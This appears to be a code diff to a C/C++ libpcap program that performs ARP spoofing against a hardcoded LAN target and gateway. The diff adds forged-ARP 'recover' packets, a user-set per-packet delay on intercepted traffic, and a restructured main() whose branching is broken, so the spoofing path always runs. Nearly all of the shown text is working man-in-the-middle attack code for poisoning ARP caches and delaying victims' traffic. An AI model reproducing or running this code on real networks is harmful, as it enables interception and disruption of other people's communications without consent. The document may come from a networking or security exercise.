@@ -6,13 +6,15 @@ void ifprint(pcap_if_t *d);
 
 char *iptos(u_long in);
 
+int us;
+
 void list_dev();
 
 pcap_t *open_adapter();
 
 void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
 
-arp_packet deceive_dst_packet, deceive_gateway_packet;
+arp_packet deceive_dst_packet, deceive_gateway_packet, recover_dst_packet, recover_gateway_packet;
 pcap_t *adapter;
 u_char dst_mac[] = {0x58, 0x91, 0xcf, 0x98, 0x7b, 0xff};
 u_char dst_ip[] = {192, 168, 43, 215};
@@ -49,6 +51,32 @@ void init_packet() {
     memcpy(deceive_gateway_packet.arp_hdr.src_ip, dst_ip, 4);
     memcpy(deceive_gateway_packet.arp_hdr.dst_mac, gateway_mac, 6);
     memcpy(deceive_gateway_packet.arp_hdr.dst_ip, gateway_ip, 4);
+
+    memcpy(recover_dst_packet.eth_hdr.dst_mac, dst_mac, 6);
+    memcpy(recover_dst_packet.eth_hdr.src_mac, src_mac, 6);
+    recover_dst_packet.eth_hdr.type = htons(0x0806);
+    recover_dst_packet.arp_hdr.hardware_type = htons(0x0001);
+    recover_dst_packet.arp_hdr.proto_type = htons(0x0800);
+    recover_dst_packet.arp_hdr.hardware_size = 0x06;
+    recover_dst_packet.arp_hdr.proto_size = 0x04;
+    recover_dst_packet.arp_hdr.opcode = htons(0x0002);
+    memcpy(recover_dst_packet.arp_hdr.src_mac, src_mac, 6);
+    memcpy(recover_dst_packet.arp_hdr.src_ip, src_ip, 4);
+    memcpy(recover_dst_packet.arp_hdr.dst_mac, dst_mac, 6);
+    memcpy(recover_dst_packet.arp_hdr.dst_ip, dst_ip, 4);
+
+    memcpy(recover_gateway_packet.eth_hdr.dst_mac, gateway_mac, 6);
+    memcpy(recover_gateway_packet.eth_hdr.src_mac, src_mac, 6);
+    recover_gateway_packet.eth_hdr.type = htons(0x0806);
+    recover_gateway_packet.arp_hdr.hardware_type = htons(0x0001);
+    recover_gateway_packet.arp_hdr.proto_type = htons(0x0800);
+    recover_gateway_packet.arp_hdr.hardware_size = 0x06;
+    recover_gateway_packet.arp_hdr.proto_size = 0x04;
+    recover_gateway_packet.arp_hdr.opcode = htons(0x0002);
+    memcpy(recover_gateway_packet.arp_hdr.src_mac, src_mac, 6);
+    memcpy(recover_gateway_packet.arp_hdr.src_ip, src_ip, 4);
+    memcpy(recover_gateway_packet.arp_hdr.dst_mac, gateway_mac, 6);
+    memcpy(recover_gateway_packet.arp_hdr.dst_ip, gateway_ip, 4);
 }
 
 void *arp_spoofing(void *arg) {
@@ -72,19 +100,49 @@ void *arp_spoofing(void *arg) {
     }
 }
 
+void *arp_recover(void *arg) {
+    while (true) {
+        // Send down the deceive_dst_packet
+        if (pcap_sendpacket(adapter,                                 // Adapter
+                            (const u_char *) &recover_dst_packet,    // buffer with the deceive_dst_packet
+                            sizeof(recover_dst_packet)               // size
+        ) != 0) {
+            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
+            return nullptr;
+        }
+        if (pcap_sendpacket(adapter,                                        // Adapter
+                            (const u_char *) &recover_gateway_packet,       // buffer with the deceive_dst_packet
+                            sizeof(recover_gateway_packet)                  // size
+        ) != 0) {
+            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
+            return nullptr;
+        }
+        sleep(1);
+    }
+}
+
 int main() {
     list_dev();
 
     init_packet();
 
-    pthread_t tid;
-    pthread_create(&tid, nullptr, &arp_spoofing, nullptr);
+    int choose;
+    scanf("%d",&us);
 
-    //start the capture
-    pcap_loop(adapter, 0, packet_handler, NULL);
+    if (true) {
+        pthread_t tid;
+        pthread_create(&tid, nullptr, &arp_spoofing, nullptr);
 
-    pcap_close(adapter);
-    getchar();
+        //start the capture
+        pcap_loop(adapter, 0, packet_handler, NULL);
+
+        pcap_close(adapter);
+        getchar();
+    }
+    else if (choose==2)
+    {
+        arp_recover(nullptr);
+    }
 
     return 0;
 }
@@ -95,31 +153,17 @@ void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_cha
     char timestr[16];
     ethernet_header *eh;
     ip_header *ih;
-    udp_header *uh;
-    u_int ip_len;
-    u_short sport, dport;
-    time_t local_tv_sec;
 
     /*
      * Unused variable
      */
     (void) (param);
 
-    /* convert the timestamp to readable format */
-    //local_tv_sec = header->ts.tv_sec;
-    //localtime(&ltime);
-    //strftime(timestr, sizeof timestr, "%H:%M:%S", &ltime);
-
-    /* print timestamp and length of the packet */
-    //printf("%s.%.6ld len:%d\n", timestr, header->ts.tv_usec, header->len);
-
     eh = (ethernet_header *) pkt_data;
-    /*printf("MAC Address: %X:%X:%X:%X:%X:%X -> %X:%X:%X:%X:%X:%X\n",
-           eh->src_mac[0], eh->src_mac[1], eh->src_mac[2], eh->src_mac[3], eh->src_mac[4], eh->src_mac[5],
-           eh->dst_mac[0], eh->dst_mac[1], eh->dst_mac[2], eh->dst_mac[3], eh->dst_mac[4], eh->dst_mac[5]);*/
-    //printf("%lx",eh->type);
 
-    usleep(100000);
+    // Make latency
+    usleep(us);
+
     if (eh->type == htons(0x0800))    // IPv4 is 0x0800
     {
         /* retireve the position of the ip header */
